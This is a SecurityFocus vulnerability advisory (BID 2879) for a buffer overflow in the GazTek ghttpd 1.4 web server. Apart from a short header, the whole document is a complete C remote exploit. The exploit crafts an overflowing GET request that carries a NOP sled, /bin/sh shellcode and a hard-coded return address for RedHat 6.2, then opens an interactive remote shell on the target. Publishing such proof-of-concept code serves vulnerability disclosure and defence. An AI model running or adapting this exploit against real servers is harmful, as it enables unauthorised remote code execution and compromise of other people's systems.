source: http://www.securityfocus.com/bid/2879/info

ghttpd is a freely available, open source web server for Unix systems. ghttpd supports CGI and is easy to configure and use.

A buffer overflow is known to exist in ghttp which will allow arbitrary code to be executed with the privileges of the webserver.

Proof-of-concept code has demonstrated that this vulnerability can be exploited by remote attackers.

/* 
 * GazTek HTTP Daemon v1.4 (ghttpd) Linux x86 remote exploit
 * by qitest1 - 17/06/2001
 * 
 * Root privileges are dropped out by the daemon, so a shell owned by
 * nobody will be executed. 
 *
 * 0x69.. =) 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define RETPOS 		161

struct targ
{
   int                  def;
   char                 *descr;
   unsigned long int    retaddr;
};

struct targ target[]=
    {                   
      {0, "RedHat 6.2 with GazTek HTTP Daemon v1.4 (ghttpd) from tar.gz", 0xbfffba47},		
      {69, NULL, 0}				
    };

  /* Just the dear old Aleph1's shellcode. This is the only shellcode
   * that seemed to work with this vulnerability. All the other ones 
   * made the daemon crashing too early and zapping out connection, 
   * shell and all their friends.   
   */
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char            mybuf[RETPOS + 4];

int             sockami(char *host, int port);
void		do_mybuf(unsigned long retaddr);
void		shellami(int sock);
void		usage(char *progname);

main(int argc, char **argv)
{
int     sel = 0,
        offset = 0,
        sock,
        cnt;
char    *host = NULL,
	sbuf[1024];

  printf("\n  GazTek HTTP Daemon v1.4 (ghttpd) exploit by qitest1\n\n");
  
  if(argc == 1)
        usage(argv[0]);
  while((cnt = getopt(argc,argv,"h:t:o:")) != EOF)
    {
   switch(cnt)
        {
   case 'h':
     host = strdup(optarg);
     break;
   case 't':
     sel = atoi(optarg);       
     break;
   case 'o':
     offset = atoi(optarg);
     break;
   default:
     usage(argv[0]);
     break;
        }
    }
  if(host == NULL)
        usage(argv[0]);

  printf("+Host: %s\n  as: %s\n", host, target[sel].descr);
  printf("+Connecting to %s...\n", host);
  sock = sockami(host, 80);
  printf("  connected\n");

  target[sel].retaddr += offset;
  printf("+Building buffer with retaddr: %p...\n", target[sel].retaddr);
  do_mybuf(target[sel].retaddr);
  printf("  done\n");

  sprintf(sbuf, "GET /%s\n\n", mybuf);
  send(sock, sbuf, strlen(sbuf), 0);
  printf("+Overflowing...\n");

  printf("+Zzing...\n");
  sleep(2);
  printf("+Getting shell...\n"); 
  shellami(sock);  
}


int
sockami(char *host, int port)
{
struct sockaddr_in address;
struct hostent *hp;
int sock;

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1)
        {
          perror("socket()");
          exit(-1);
        }
 
  hp = gethostbyname(host);
  if(hp == NULL)
        {
          perror("gethostbyname()");
          exit(-1);
        }

  memset(&address, 0, sizeof(address));
  memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);

  if(connect(sock, (struct sockaddr *) &address, sizeof(address)) == -1)
        {
          perror("connect()");
          exit(-1);
        }

  return(sock);
}


void
do_mybuf(unsigned long retaddr)
{
int		i,
		n = 0;
unsigned long 	*ret;

  memset(mybuf, 0x90, sizeof(mybuf));
  for(i = RETPOS - strlen(shellcode); i < RETPOS; i++)
	mybuf[i] = shellcode[n++];
  ret = (unsigned long *)(mybuf + RETPOS);
  *ret = retaddr;
  mybuf[RETPOS + 4] = '\x00';
}

void
shellami(int sock)
{
int             n;
char            recvbuf[1024];
char            *cmd = "id; uname -a\n";
fd_set          rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&rset);
      FD_SET(sock,&rset);
      FD_SET(STDIN_FILENO,&rset);
      select(sock+1,&rset,NULL,NULL,NULL);
      if (FD_ISSET(sock,&rset))
        {
          n=read(sock,recvbuf,1024);
          if (n <= 0)
            {
              printf("Connection closed by foreign host.\n");
              exit(0);
            }
          recvbuf[n]=0;
          printf("%s",recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO,&rset))
        {
          n=read(STDIN_FILENO,recvbuf,1024);
          if (n>0)
            {
              recvbuf[n]=0;
              write(sock,recvbuf,n);
            }
        }
    }
  return;
}

void
usage(char *progname)
{
int             i = 0;
  
  printf("Usage: %s [options]\n", progname);
  printf("Options:\n"
         "  -h hostname\n"
         "  -t target\n"
         "  -o offset\n"
         "Available targets:\n");
  while(target[i].def != 69)
        { 
          printf("  %d) %s\n", target[i].def, target[i].descr);
          i++;
        } 

  exit(1);
}